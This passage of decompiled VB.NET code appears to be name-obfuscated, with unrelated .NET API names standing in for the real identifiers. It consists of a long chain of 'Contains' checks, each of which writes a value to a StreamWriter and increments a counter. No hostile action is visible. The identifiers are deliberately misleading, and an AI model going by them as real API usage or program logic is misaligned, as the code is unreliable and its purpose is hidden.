                    streamWriter.WriteLine(isImplicit.set_SignedFile())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FreeHGlobal())) Then
                    streamWriter.WriteLine(isImplicit.GetResult())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_SecurePassword())) Then
                    streamWriter.WriteLine(isImplicit.CorMetaDataDispenser())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CompileAssemblyFromSourceBatch())) Then
                    streamWriter.WriteLine(isImplicit.EventRegistrationTokenList())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LogIsolation)) Then
                    streamWriter.WriteLine(isImplicit.GetSerialNumber())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateWriter())) Then
                    streamWriter.WriteLine(isImplicit.GetWindowLongPtr64())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_StrokeJoin())) Then
                    streamWriter.WriteLine(isImplicit.EscapePressed)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_RowUpdated())) Then
                    streamWriter.WriteLine(isImplicit.CompilationFlags())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PropagateOutParameters())) Then
                    streamWriter.WriteLine(isImplicit.SelectedNotFocus)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ApplicationIntent)) Then
                    streamWriter.WriteLine(isImplicit.TaskDisplayName)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OutlineRect)) Then
                    streamWriter.WriteLine(isImplicit.set_NewLineChars())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HighContrast)) Then
                    streamWriter.WriteLine(isImplicit.ShutdownProcessEvent)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Color())) Then
                    streamWriter.WriteLine(isImplicit.ExpectContinue)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetExtent())) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewCellStyleConverter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ExtendedProtectionPolicyElement())) Then
                    streamWriter.WriteLine(isImplicit.MemberFilter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsILOnly)) Then
                    streamWriter.WriteLine(isImplicit.Callback)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Number)) Then
                    streamWriter.WriteLine(isImplicit.RouterAdvertisementsReceived)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Panel())) Then
                    streamWriter.WriteLine(isImplicit.BIND_OPTS())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetGlobalSymbolFactory())) Then
                    streamWriter.WriteLine(isImplicit.CodePageHeader())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AttributeFormDefault)) Then
                    streamWriter.WriteLine(isImplicit.GetImageSize())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Directory())) Then
                    streamWriter.WriteLine(isImplicit.CorAssemblyFlags())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.VectorViewToReadOnlyCollectionAdapter())) Then
                    streamWriter.WriteLine(isImplicit.AccessToken)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.NotifyDefault())) Then
                    streamWriter.WriteLine(isImplicit.SettingValueElement())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StopTimer())) Then
                    streamWriter.WriteLine(isImplicit.add_ButtonClick())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CanNotSetTable())) Then
                    streamWriter.WriteLine(isImplicit.ImportSchemaType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_OutputDataReceived())) Then
                    streamWriter.WriteLine(isImplicit.OnLazyAdd())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DataTableMapping())) Then
                    streamWriter.WriteLine(isImplicit.ExpressionAndUnique())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsArray)) Then
                    streamWriter.WriteLine(isImplicit.Int64NumberHeaderParser())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AppWorkspace)) Then
                    streamWriter.WriteLine(isImplicit.DbiScope())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddProperty())) Then
                    streamWriter.WriteLine(isImplicit.AutoScaleDimensions)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.c__DisplayClass21_0())) Then
                    streamWriter.WriteLine(isImplicit.DrawRadioButton())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_CustomStartCap())) Then
                    streamWriter.WriteLine(isImplicit.remove_TrueValueChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SECURITY_QUALITY_OF_SERVICE())) Then
                    streamWriter.WriteLine(isImplicit.add_NetworkAvailabilityChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ImeModeConversion())) Then
                    streamWriter.WriteLine(isImplicit.GetOptionalStatements())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SubscriptionIdentity)) Then
                    streamWriter.WriteLine(isImplicit.DocumentElement)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ResetSelectedProperty())) Then
                    streamWriter.WriteLine(isImplicit.GetMethGrpType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Run())) Then
                    streamWriter.WriteLine(isImplicit.RemotingParameterCachedData())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PermissionState())) Then
                    streamWriter.WriteLine(isImplicit.ElementCount)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IdnMapping())) Then
                    streamWriter.WriteLine(isImplicit.ReadOuterXml())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Prime2)) Then
                    streamWriter.WriteLine(isImplicit.Utilities())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IgnoreComments)) Then
                    streamWriter.WriteLine(isImplicit.StartMonitoringStreamForChanges())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IntExtractAssociatedIcon())) Then
                    streamWriter.WriteLine(isImplicit.DragQueryFile())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CheckGroupInstalled())) Then
                    streamWriter.WriteLine(isImplicit.setType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LandscapeAngle)) Then
                    streamWriter.WriteLine(isImplicit.EnableModeless())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HttpGeneralHeaders())) Then
                    streamWriter.WriteLine(isImplicit.EventLogRecord())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetPID())) Then
                    streamWriter.WriteLine(isImplicit.GetOnmousemove())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ThemeHandle())) Then
                    streamWriter.WriteLine(isImplicit.SqlFileStream())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ComNativeDescriptionProvider())) Then
                    streamWriter.WriteLine(isImplicit.add_MouseDown())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ItemCheckEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.IStore_BindingResult())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Question)) Then
                    streamWriter.WriteLine(isImplicit.Com2ExtendedBrowsingHandler())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsEqual())) Then
                    streamWriter.WriteLine(isImplicit.EvtGetPublisherMetadataProperty())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SchemaAttDef())) Then
                    streamWriter.WriteLine(isImplicit.TryLoad16Bits())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetSaturation())) Then
                    streamWriter.WriteLine(isImplicit.TwoLetterISOLanguageName)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ServerVersion)) Then
                    streamWriter.WriteLine(isImplicit.MultiSelect)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FullNameToken)) Then
                    streamWriter.WriteLine(isImplicit.Last)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_AutoScrollMinSize())) Then
                    streamWriter.WriteLine(isImplicit.c__10())
                    Me.EndOf.get_VisibleFieldCount(Me.set_Select)
                    num = num + 1
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddAssembly())) Then
                    streamWriter.WriteLine(isImplicit.IteratorStateMachineAttribute())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DynamicTypeInfo())) Then
                    streamWriter.WriteLine(isImplicit.ECDsaP384)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TimeZoneInfo())) Then
                    streamWriter.WriteLine(isImplicit.GetParentRowTableMismatch())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.EventLogReadingException())) Then
                    streamWriter.WriteLine(isImplicit.Menu)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LicenseContext())) Then
                    streamWriter.WriteLine(isImplicit.add_ChangeUICues())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateAdjustmentRule())) Then
                    streamWriter.WriteLine(isImplicit.ObfuscationAttribute())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_ReflectionOnlyNamespaceResolve())) Then
                    streamWriter.WriteLine(isImplicit.UnderlyingSystemType)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Description())) Then
                    streamWriter.WriteLine(isImplicit.GetBoolValueEvent())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GdiObjectType())) Then
                    streamWriter.WriteLine(isImplicit.WriteFullEndElement())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FontDialog())) Then
                    streamWriter.WriteLine(isImplicit.CannotRemoveConstraint())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AvailableEditPositionCount)) Then
                    streamWriter.WriteLine(isImplicit.Indexer)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetFileFromName())) Then
                    streamWriter.WriteLine(isImplicit.Assembly())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LogicalGetData())) Then
                    streamWriter.WriteLine(isImplicit.FormWindowState())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Rectangle)) Then
                    streamWriter.WriteLine(isImplicit.CompilerParameters())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsolatedStorage())) Then
                    streamWriter.WriteLine(isImplicit.ChevronVertical())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrentRow)) Then
                    streamWriter.WriteLine(isImplicit.OffsetY)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SchemaNamespaceManager())) Then
                    streamWriter.WriteLine(isImplicit.DnsPermission())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TextShadowType())) Then
                    streamWriter.WriteLine(isImplicit.ASCII)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Resuming())) Then
                    streamWriter.WriteLine(isImplicit.MemberDescriptor())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SubstringEquals())) Then
                    streamWriter.WriteLine(isImplicit.ListViewItemSelectionChangedEventArgs())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RawDefaultValue)) Then
                    streamWriter.WriteLine(isImplicit.Particle)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StatusBarPanelAutoSize())) Then
                    streamWriter.WriteLine(isImplicit.SqlDependencyProcessDispatcher())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReleaseAccessor())) Then
                    streamWriter.WriteLine(isImplicit.GetInArgName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LayoutEngine())) Then
                    streamWriter.WriteLine(isImplicit.ListBindingHelper())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IndexKeyLength())) Then
                    streamWriter.WriteLine(isImplicit.SELCHANGE())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MergeExecutor())) Then
                    streamWriter.WriteLine(isImplicit.EnumSignatures())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ITypeResolutionService())) Then
                    streamWriter.WriteLine(isImplicit.AutomaticDelay)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetAddedAndModifiedCalledOnnonUnchanged())) Then
                    streamWriter.WriteLine(isImplicit.FromStream())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DictionaryToMapAdapter())) Then
                    streamWriter.WriteLine(isImplicit.VerifyWriteTo())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.c__DisplayClass131_0())) Then
                    streamWriter.WriteLine(isImplicit.PipeOptions())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CheckedContext())) Then
                    streamWriter.WriteLine(isImplicit.LoopExpressionProxy())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_BalloonTipShown())) Then
                    streamWriter.WriteLine(isImplicit.GetAmbiguousTimeOffsets())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CERT_POLICY_ID())) Then
                    streamWriter.WriteLine(isImplicit.DoesTextualDefinitionMatchTextualReference())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AsyncState)) Then
                    streamWriter.WriteLine(isImplicit.GetDayName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DisconnectReuseSocket)) Then
                    streamWriter.WriteLine(isImplicit.Scale())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.NoMoveHoriz)) Then
                    streamWriter.WriteLine(isImplicit.GetRawConstantValue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_AutomaticDelay())) Then
                    streamWriter.WriteLine(isImplicit.SoapElement)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetDataFld())) Then
                    streamWriter.WriteLine(isImplicit.GetOnCut())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.BinderState())) Then
                    streamWriter.WriteLine(isImplicit.ClickOnceUtility())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LinePragma)) Then
                    streamWriter.WriteLine(isImplicit.GetSqlInt16())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AppName)) Then
                    streamWriter.WriteLine(isImplicit.d__193())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ExportPolicy)) Then
                    streamWriter.WriteLine(isImplicit.MatchEnumerator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetManifestFromPEResources())) Then
                    streamWriter.WriteLine(isImplicit.SelectMany())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ConfiguredTaskAwaitable())) Then
                    streamWriter.WriteLine(isImplicit.NextNodePage)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.NonLeafSig())) Then
                    streamWriter.WriteLine(isImplicit.ClipBounds)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FalseValue)) Then
                    streamWriter.WriteLine(isImplicit.Com2IPerPropertyEnumConverter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_EventName())) Then
                    streamWriter.WriteLine(isImplicit.IsByValue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_HeaderFontChanged())) Then
                    streamWriter.WriteLine(isImplicit.SECURITY_ATTRIBUTES())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ModuleResolveEventHandler())) Then
                    streamWriter.WriteLine(isImplicit.HasPropertyPages())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.BOF)) Then
                    streamWriter.WriteLine(isImplicit.Color())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ondataavailable())) Then
                    streamWriter.WriteLine(isImplicit.Mutex)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HaveResponse)) Then
                    streamWriter.WriteLine(isImplicit.PeakPagedMemorySize)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReferenceComparer())) Then
                    streamWriter.WriteLine(isImplicit.EvtRenderContextFlags())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.EventChannel())) Then
                    streamWriter.WriteLine(isImplicit.ExecuteReaderAsync())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DisplayStyleForCurrentCellOnly)) Then
                    streamWriter.WriteLine(isImplicit.MD5)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CursorSize)) Then
                    streamWriter.WriteLine(isImplicit.ExtEscape())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_NullTextChanged())) Then
                    streamWriter.WriteLine(isImplicit.SetValueDirect())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrentDomain())) Then
                    streamWriter.WriteLine(isImplicit.DSRowDiffIdUsageSection())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetSqlInt32())) Then
                    streamWriter.WriteLine(isImplicit.BlinkRate)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StartDate)) Then
                    streamWriter.WriteLine(isImplicit.DrawSizeBox())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_AverageCharWidth())) Then
                    streamWriter.WriteLine(isImplicit.SafeArrayRankMismatchException())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddError())) Then
                    streamWriter.WriteLine(isImplicit.set_CheckState())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Fuchsia)) Then
                    streamWriter.WriteLine(isImplicit.DayOfWeek)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CngAlgorithmGroup())) Then
                    streamWriter.WriteLine(isImplicit.LightCyan)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.XmlSchemaSimpleTypeContent())) Then
                    streamWriter.WriteLine(isImplicit.DataBound)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Style())) Then
                    streamWriter.WriteLine(isImplicit.ApplyDefaultSort)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Clipboard)) Then
                    streamWriter.WriteLine(isImplicit.CheckUnique())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TitleForeColor)) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewComboBoxEditingControl())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsThreadPoolThread)) Then
                    streamWriter.WriteLine(isImplicit.set_CodecName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ConsoleTraceListener())) Then
                    streamWriter.WriteLine(isImplicit.CreateAppDomainLevel())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReadState())) Then
                    streamWriter.WriteLine(isImplicit.ShowPrintPreviewDialog())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RuntimeBinderException())) Then
                    streamWriter.WriteLine(isImplicit.SetRootObject())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Sort())) Then
                    streamWriter.WriteLine(isImplicit.PipeStreamAsyncResult())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SqlTransaction())) Then
                    streamWriter.WriteLine(isImplicit.GetOnDeactivate())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GroupByBehavior())) Then
                    streamWriter.WriteLine(isImplicit.SafeCredentialReference())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DataGridViewElementStates())) Then
                    streamWriter.WriteLine(isImplicit.set_BindingRedirects())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SigningCertificate)) Then
                    streamWriter.WriteLine(isImplicit.CaptionButton())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReadGenericParamConstraintRow())) Then
                    streamWriter.WriteLine(isImplicit.BeginTransaction())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetUserDefinedCallMethod())) Then
                    streamWriter.WriteLine(isImplicit.d__31())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_EventChannelType())) Then
                    streamWriter.WriteLine(isImplicit.FindToolStrip())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StandardCommands())) Then
                    streamWriter.WriteLine(isImplicit.set_ShowColor())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.UnicodeEncodingConformance)) Then
                    streamWriter.WriteLine(isImplicit.NIname)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CNullable())) Then
                    streamWriter.WriteLine(isImplicit.d__28())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsContentKindMatch())) Then
                    streamWriter.WriteLine(isImplicit.IsTypeDef())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Datatype_decimal())) Then
                    streamWriter.WriteLine(isImplicit.set_TrailingForeColor())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ComponentEditorPageSite())) Then
                    streamWriter.WriteLine(isImplicit.CompressedStackSwitcher())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SqlProcedureAttribute())) Then
                    streamWriter.WriteLine(isImplicit.SetBorderWidth())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SqlFunctionAttribute())) Then
                    streamWriter.WriteLine(isImplicit.ImageFormat())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SafeBSTRHandle())) Then
                    streamWriter.WriteLine(isImplicit.GetInternalAppId())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.XmlCodeExporter())) Then
                    streamWriter.WriteLine(isImplicit.SslCredKey())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AttributeUsageAttribute())) Then
                    streamWriter.WriteLine(isImplicit.MaximumStale)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetOnPage())) Then
                    streamWriter.WriteLine(isImplicit.ListControlConvertEventArgs())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.accDoDefaultAction())) Then
                    streamWriter.WriteLine(isImplicit.HybridWebProxyFinder())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_BulletIndent())) Then
                    streamWriter.WriteLine(isImplicit.KeyedCollection())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateStore)) Then
                    streamWriter.WriteLine(isImplicit.Attr)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MemoryMappedFileStreamCreator())) Then
                    streamWriter.WriteLine(isImplicit.d__3())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CacheDict())) Then
                    streamWriter.WriteLine(isImplicit.set_StripAfterObfuscation())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_PrivateBinPath())) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewColumnConverter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DynamicMetaObject())) Then
                    streamWriter.WriteLine(isImplicit.DesignerNamespaceResolveEventArgs())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GroupCount())) Then
                    streamWriter.WriteLine(isImplicit.set_HelpNamespace())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Positions)) Then
                    streamWriter.WriteLine(isImplicit.DefaultCachePolicy)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetExpectedBytesTotal())) Then
                    streamWriter.WriteLine(isImplicit.GetCommandFromID())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SymbolLoader)) Then
                    streamWriter.WriteLine(isImplicit.SystemTcpStatistics())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.UnmarshalInterface())) Then
                    streamWriter.WriteLine(isImplicit.MyMethodInfo())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SettingsSavingEventHandler())) Then
                    streamWriter.WriteLine(isImplicit.ResourceTypeIdString)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_ImageScaling())) Then
                    streamWriter.WriteLine(isImplicit.EnumerableWrapperWeakToStrong())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_InternalBufferSize())) Then
                    streamWriter.WriteLine(isImplicit.c__DisplayClass135_0())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ProviderNum())) Then
                    streamWriter.WriteLine(isImplicit.CreateAcceleratorTable())
                    num = num + 1
                End If
